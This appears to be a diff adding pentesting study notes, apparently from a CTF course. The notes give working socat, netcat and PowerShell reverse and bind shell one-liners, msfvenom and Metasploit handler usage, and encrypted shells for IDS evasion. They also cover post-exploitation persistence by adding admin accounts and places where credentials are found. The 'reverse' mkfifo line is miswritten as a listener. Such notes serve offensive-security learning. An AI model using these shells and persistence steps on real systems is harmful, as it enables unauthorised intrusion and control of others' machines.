+                    socat TCP:<lhost>:<lport> EXEC:"bash -li"
+
+
+            Bind Shells
+
+                On a Linux target
+
+                    socat TCP-L:<rport> EXEC:"bash -li"
+
+                On a Windows target
+                    "pipes" to interface between the Unix and Windows ways of handling input and output in a CLI
+
+                    socat TCP-L:<rport> EXEC:powershell.exe,pipes
+
+                Regardless of the target, on our attacking machine
+
+                    socat TCP:<rhost>:<rport> -
+
+
+            A fully stable tty reverse shell (tty stands for TeleTYpewriter)
+                The most powerful uses for socat, only work when the target is Linux
+
+                    Listener syntax
+
+                        socat TCP-L:<lport> FILE:`tty`,raw,echo=0
+
+                            We are passing in the current tty as a file and setting the echo to be zero
+                                Approximately equivalent to using the Netcat trick Ctrl + Z, stty raw -echo; fg
+                                With the added bonus of being immediately stable and hooking into a full tty
+
+                            This special listener must be activated with a very specific socat command
+                                This means that the target must have socat installed
+                                Most machines do not have socat installed (upload a precompiled socat binary)
+
+                    The specific command
+
+                        socat TCP:<lhost>:<lport> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
+                            EXEC:"bash -li"     Creates an interactive bash session
+
+                            pty                 Allocates a pseudoterminal on the target
+                                                    Part of the stabilisation process
+
+                            stderr              Makes sure that any error messages get shown in the shell
+                                                    Often a problem with non-interactive shells
+
+                            sigint              Passes any Ctrl + C commands throught into the sub-process
+                                                    Allowing us to kill commands inside the shell
+
+                            setsid              Creates the process in a new session
+
+                            sane                Stabilises the terminal, attempting to "normalise" it
+
+
+        Socat Encrypted Shells
+
+            Cannot be spied on unless you have the decryption key
+            Are often able to bypass an IDS as a result
+
+
+            We first need to generate a certificate
+                This is easiest to do on our attacking machine
+
+                    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+
+                        Creates a 2048 bit RSA key with matching cert file
+                            Self-signed and valid for just under a year
+                                Information can be filled randomly
+
+                    We then need to merge the two created files into a single .pem file
+
+                        cat shell.key shell.crt > shell.pem
+
+                            The certificate must be used on whichever device is listening
+
+
+            Reverse Shell
+
+                Listening (attacker)
+
+                    socat OPENSSL-LISTEN:<lport>,cert=shell.pem,verify=0 -
+
+                        verify=0        Tells the connection to not bother trying to validate that our
+                                        certificate has been properly signed by a recognised authority
+
+                Connecting (target)
+
+                    socat OPENSSL:<lhost>:<lport>,verify=0 EXEC:/bin/bash
+
+            Bind Shell
+
+                Listening (target)
+
+                    socat OPENSSL-LISTEN:<rport>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+                        Copying the PEM file accross for Windows target is required
+
+                Connecting (attacker)
+
+                    socat OPENSSL:<rhost>:<rport>,verify=0 -
+
+
+        Common Shell Payloads
+
+            Windows
+                A static binary is nearly always required
+
+            Kali
+                find / -name *nc.exe* 2>/dev/null                   For Windows
+                find / -name *netcat-traditional* 2>/dev/null       Used in Kali itself
+
+            Linux
+                On the target
+                    Bind        nc -lnvp <rport> -e /bin/bash
+                    Reverse     nc <lhost> <lport> -e /bin/bash
+
+                However, this is not included in most versions of netcat as it is widely seen to be very insecure
+
+                    Bind Shell
+
+                        mkfifo /tmp/f; nc -lnvp <rport> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+                            Creates a named pipe at /tmp/f
+                                FIFO stands for "First In, First Out"
+                                Pipes allow separate processes to communicate without having been designed explicitly to work together
+
+                            Starts a listener
+                                Connects the input of the listener to the output of the named pipe
+
+                            The output of the listener then gets piped directly into sh
+                                Sending the stderr output stream into stdout
+                                And sending stdout itself into the input of the named pipe, thus completing the circle
+
+                    Reverse Shell
+
+                        mkfifo /tmp/f; nc -lnvp <lhost> <lport> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+
+            Modern Windows Server
+
+                powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<lhost>',<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+                    The standard one-liner PSH reverse shell can be copied into a cmd.exe shell, a Web Shell, etc.
+                    It is very common to require a PowerShell reverse shell
+
+
+            More on GitHub
+
+                PayloadsAllTheThings
+                    Methodology and Resources
+                        Reverse Shell Cheatsheet.md
+
+
+        msfvenom (Metasploit framework)
+
+            Used to generate code for primarily reverse and bind shells
+
+            Used extensively in lower-level exploit development to generate hexadecimal shellcode
+                When developing something like a Buffer Overflow exploit
+
+
+            Also used to generate payloads in various formats (.exe, .aspx, .war, .py, etc.)
+
+                Standard syntax
+                    msfvenom -p <payload> <options>
+
+                        -f <outputFormat>
+                        -o <outputFile>
+                        LHOST               IP to connect back to
+                        LPORT               Port on the attacker machine
+
+                Example
+                    msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<lhost> LPORT=<lport>
+
+
+            Staged payloads (sent in two parts)
+
+                The small initial stager doesn't contain any reverse shell code itself
+                    Require a special listener, usually the Metasploit multi/handler
+                    Uses the connection to load the real payload
+
+                        Executing it directly and preventing it from touching the disk
+                        where it could be caught by traditional antivirus solutions
+
+                        Modern day antivirus solutions will also make use of AMSI
+                        (Anti-Malware Scan Interface) to detect the payload as it
+                        is loaded into memory by the stager
+
+
+            Stageless payloads (entirely self-contained)
+
+                More common, they are also bulkier
+                    Sends a shell back immediatly to the waiting listener
+
+                        Easier for antivirus or intrusion detection program to discover and remove
+
+
+            Meterpreter fully-featured shell (completely stable)
+
+                Must be caught in Metasploit
+                    A very good thing when working with Windows targets
+                    Built-in features such as file uploads and downloads
+                    Required for Metasploit's post-exploitation tools
+
+
+            Payload naming conventions
+
+                <OS>/<arch>/<payload>
+
+                    Exception for Windows 32-bit targets
+                        windows/shell_reverse_tcp
+
+                    Examples
+                        linux/x86/shell_reverse_tcp
+
+                            Stageless   shell_reverse_tcp
+                                        meterpreter_reverse_tcp
+
+                            Staged      shell/reverse_tcp
+                                        meterpreter/reverse_tcp
+
+
+            Search
+
+                msfvenom --list payloads | grep "linux/x86/meterpreter"
+
+
+        Metasploit multi/handler
+
+            Great tool for catching reverse shells
+            Essential for Meterpreter shells and staged payloads
+
+                msfconsole
+                    msf6 > use multi/handler
+                    msf6 exploit(multi/handler) > options
+
+                        set PAYLOAD <payload>
+                        set LHOST <lhost>
+                        set LPORT <lport>       Under 1024, must be run with sudo permissions
+
+                        exploit -j              Starts the listener, running as a job in the background
+
+                        sessions
+                        sessions <number>       To foreground it again
+
+
+        Web shells
+
+            Essentially commands that are entered into a webpage to obtain RCE
+                Either through a HTML form
+                Or directly as arguments in the URL
+
+            With the results returned and written to the page
+
+            This can be extremely useful if there are firewalls in place
+                Or as a stepping stone into a fully fledged reverse or bind shell
+
+            Kali /usr/share/webshells
+
+
+        Next Steps
+
+            Reverse and Bind shells are essential technique for gaining RCE on a machine
+            However, they will never be as fully featured as a native shell
+
+                We always want to escalate into using a "normal" method for accessing the machine
+                This will invariably be easier to use for further exploitation of the target
+
+                    On Linux
+
+                        Ideally we would be looking for opportunities to gain access to a user account
+                            SSH keys stored at /home/<user>/.ssh are often an ideal way to do this
+                            In CTFs it's also not infrequent to find credentials lying around somewhere on the box
+                            Some exploits will also allow you to add your own account
+                                In particular something like Dirty C0w or a writeable /etc/shadow or /etc/passwd
+                                would quickly give you SSH access to the machine, assuming SSH is open
+
+                    On Windows
+
+                        Options are often more limited
+                            It's sometimes possible to find passwords for running services in the registry
+                                VNC servers, for example, frequently leave passwords in the registry stored in plaintext
+                            Some versions of the FileZilla FTP server also leave credentials in an XML file at
+                                C:\Program Files\FileZilla Server\FileZilla Server.xml
+                                or C:\xampp\FileZilla Server\FileZilla Server.xml
+
+                        Ideally you would obtain a shell running as the SYSTEM user
+                        or an administrator account running with high privileges
+                            In such a situation it's possible to simply add your own account (in the administrators group)
+                            to the machine, then log in over RDP, telnet, winexe, psexe, WinRM or any number of other methods
+
+                                Target (Windows)
+                                    net user <username> <password> /add
+                                    net localgroup administrators <username> /add
+
+                                Attacker (Kali)
+                                    xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:<rhost> /u:<username> /p:'<password>'
+
+
+    Linux Privilege Escalation
+
+        _
+
+
+    Windows Privilege Escalation
+
+        _
+
+
